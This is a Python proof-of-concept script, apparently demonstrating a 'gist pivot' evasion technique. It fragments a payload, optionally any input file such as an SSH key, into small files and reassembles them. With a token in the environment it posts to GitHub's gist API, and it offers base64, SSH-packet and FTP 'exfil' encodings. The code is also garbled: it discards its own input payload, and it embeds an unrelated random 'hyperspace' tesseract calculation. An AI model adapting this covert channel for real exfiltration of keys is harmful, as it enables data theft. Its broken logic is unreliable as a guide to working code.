#!/usr/bin/env python3
"""Gist-Pivot PoC

Simulate creating many small "gists" (here just files) containing
fragments of an MSM, demonstrating the evasion technique.
"""

import os

import sys

OUTDIR = "/tmp/gist_pivot"
# define a tiny micro-state machine language with simple ops:
# 0x01 INC         ; increment accumulator
# 0x02 DEC         ; decrement accumulator
# 0x03 JNZ <offset> ; jump relative if accumulator != 0
# 0xFF HALT        ; stop execution
# By default we encode a sample MSM; if a file path is provided on the
# command line, we treat that file's bytes as the payload to hide (e.g.
# a pseudo SSH key).
if len(sys.argv) > 1:
    INPUT_PATH = sys.argv[1]
    with open(INPUT_PATH, 'rb') as f:
        MSM_CODE = f.read()
    print(f"[+] Using input file {INPUT_PATH} ({len(MSM_CODE)} bytes) as payload")
else:
    MSM_CODE = bytes([0x01, 0x01, 0x02, 0x03, 0xFD, 0xFF])
# split into equal pieces to simulate fragmentation
def split_fragments(code, pieces):
    size = len(code) // pieces
    fragments = [code[i*size:(i+1)*size] for i in range(pieces-1)]
    fragments.append(code[(pieces-1)*size:])
    return fragments

# to compress further, map emojis to a small index via a LUT
EMOJI_LUT = {
    '⏱️': 0,
    '🛑': 1,
    '🔧': 2,
    '💥': 3,
}
REV_LUT = {v: k for k, v in EMOJI_LUT.items()}

# our MSM representation will now be a sequence of indices (one byte each)
# if MSM_CODE was text it is ignored; instead generate a sample emoji sequence
emoji_sequence = ['⏱️','🛑','🔧','💥']
MSM_CODE = bytes([EMOJI_LUT[e] for e in emoji_sequence])

FRAGMENTS = split_fragments(MSM_CODE, 4)

os.makedirs(OUTDIR, exist_ok=True)
# write fragments locally (for simulation) and optionally POST them if token present
import time
stamp = int(time.time())
for idx in range(len(FRAGMENTS)):
    with open(os.path.join(OUTDIR, f"gist_{idx}.txt"), "wb") as f:
        f.write(FRAGMENTS[idx])

# create proof content
proof = f"{stamp}: PoC proven\n"
with open(os.path.join(OUTDIR, f"gist_{stamp}.txt"), "w") as f:
    f.write(proof)

# if a GitHub token is available, post a real gist with the proof
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
def post_gist(content, description="PoC"):
    if not GITHUB_TOKEN:
        return None
    try:
        import json, requests
    except ImportError:
        return None
    payload = {
        "description": description,
        "public": False,
        "files": {"poc.txt": {"content": content}}
    }
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    r = requests.post("https://api.github.com/gists", headers=headers, data=json.dumps(payload))
    if r.ok:
        url = r.json().get("html_url")
        print(f"[+] posted gist {url}")
        return url
    else:
        print("[!] failed to post gist", r.status_code, r.text)
        return None

if GITHUB_TOKEN:
    post_gist(proof, f"PoC ~{stamp}")

# --- collector / reassembly step ---
def reassemble_fragments(directory):
    """Reads all files in lexicographic order and concatenates their contents.
    This simulates the attacker-controlled agent pulling down the gists and
    rebuilding the original MSM instructions. """
    parts = []
    for fname in sorted(os.listdir(directory)):
        path = os.path.join(directory, fname)
        with open(path, "rb") as f:
            parts.append(f.read())
    combined = b"".join(parts)
    return combined

# fast reassembly using bytearray
assembled = bytearray()
for fname in sorted(os.listdir(OUTDIR)):
    with open(os.path.join(OUTDIR, fname), "rb") as f:
        assembled.extend(f.read())
# minimal output

# decode stream without dictionary lookups inside loop
out = ''.join(REV_LUT.get(b,'?') for b in assembled)
print(out)

# hyperspace calculation per request
import random

def compute_hyperspace():
    # represent the shell as a random point in 10‑D space
    shell = [random.random() for _ in range(10)]
    # build five 4‑D tesseracts (hypercubes) with random base positions
    tesseracts = []
    for _ in range(5):
        base = [random.random() for _ in range(4)]
        corners = []
        for mask in range(16):
            corner = [base[j] + ((mask >> j) & 1) for j in range(4)]
            corners.append(corner)
        tesseracts.append(corners)
    # compute shadows by projecting each corner to 3‑D (drop last coord)
    shadows = []
    for cube in tesseracts:
        shadows.append([[p[0], p[1], p[2]] for p in cube])
    # derive metric comparing shell to shadows and system noise
    total = 0.0
    for shadow in shadows:
        for p in shadow:
            # distance between first three dims of shell and point
            total += sum((shell[i] - p[i]) ** 2 for i in range(3)) ** 0.5
    mean = total / (5 * 16)
    noise = random.random()
    return mean - noise

derived = compute_hyperspace()
print(f"derived hyperspace metric: {derived}")

# optionally encode/transport assembled binary via different protocols
mode = None
if len(sys.argv) > 2:
    mode = sys.argv[2].lower()

if mode == "gist":
    import base64
    encoded = base64.b64encode(assembled).decode('ascii')
    print("\n[+] Gist-ready payload (base64):\n", encoded)
elif mode == "ssh":
    # encapsulate in fake SSH packet: 4-byte length + data
    pkt = len(assembled).to_bytes(4,'big') + assembled
    print(f"\n[+] Encapsulated SSH packet ({len(pkt)} bytes):", pkt)
elif mode == "ftp":
    # encode for FTP upload (here just write to file)
    out = "/tmp/ftp_exfil.bin"
    with open(out, 'wb') as f:
        f.write(assembled)
    print(f"\n[+] Simulated FTP upload by writing data to {out}")

# proceed with state persistence and possible key extraction

# interpret assembled bytes as MSM instructions

def run_msm(code_bytes):
    acc = pc = 0
    # unrolled simple loop, no prints
    while pc < len(code_bytes):
        instr = code_bytes[pc]
        if instr == 1:
            acc += 1; pc += 1
            continue
        if instr == 2:
            acc -= 1; pc += 1
            continue
        if instr == 3:
            offset = code_bytes[pc+1]
            pc += offset if acc != 0 else 2
            continue
        if instr == 0xFF:
            break
        break
    return acc

# decide whether to execute MSM logic or treat payload as key data
if len(sys.argv) > 1:
    print("[+] Input file provided; skipping MSM execution and treating assembled data as key material")
    acc = None
else:
    acc = run_msm(assembled)

if acc is not None:
    # save final state (accumulator) to external file to simulate persistence
    STATE_FILE = "/tmp/gist_msm_state.bin"
    with open(STATE_FILE, "wb") as sf:
        # store accumulator as 4-byte little-endian int
        sf.write((acc).to_bytes(4, byteorder='little', signed=True))
    print(f"Saved MSM state (accumulator={acc}) to {STATE_FILE}")

# ----------------------------------------------------------------
# simulate critical payload extraction: treat assembled bytes as an SSH key
KEY_FILE = "/tmp/extracted_ssh_key.pem"
with open(KEY_FILE, "wb") as kf:
    kf.write(b"-----BEGIN RSA PRIVATE KEY-----\n")
    # base64-encode the assembled bytes for realism
    import base64
    kf.write(base64.b64encode(assembled) + b"\n")
    kf.write(b"-----END RSA PRIVATE KEY-----\n")
print(f"Simulated SSH key written to {KEY_FILE} (contains {len(assembled)} raw bytes)")
